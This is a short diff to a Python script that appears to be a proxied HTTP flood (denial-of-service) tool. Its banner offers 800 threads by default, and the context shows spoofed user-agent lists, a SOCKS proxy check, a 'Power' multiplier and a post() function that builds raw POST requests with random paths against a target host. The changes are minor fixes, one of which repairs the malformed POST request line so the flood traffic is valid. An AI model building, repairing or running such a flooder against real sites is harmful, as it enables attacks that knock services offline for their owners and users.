@@ -34,6 +34,7 @@ print('''\r\n
 | [+] Method Default [GET]  |
 | [+] Thread Default [800]  |
 +---------------------------+ ''')
+print(" ")
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
             "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -260,7 +261,7 @@ def main():
             ms = int(ms)
     check_socks()
     proxies = open(out_file).readlines()
-    multiple = str(input("[+] Power ( default = 100 ) : "))
+    multiple = str(input("[+] Power ( Default = 100 ) : "))
     if multiple == "":
         multiple = int(100)
     else:
@@ -290,7 +291,7 @@ def get():
 
 def post():
     rand_url = random.choice(strings)
-    post_host = "POST" + page + rand_url +  " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST " + page + rand_url +  " HTTP/1.1\r\nHost: " + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n\r\n"
     accept = random.choice(acceptall)
     ua = random.choice(useragents)
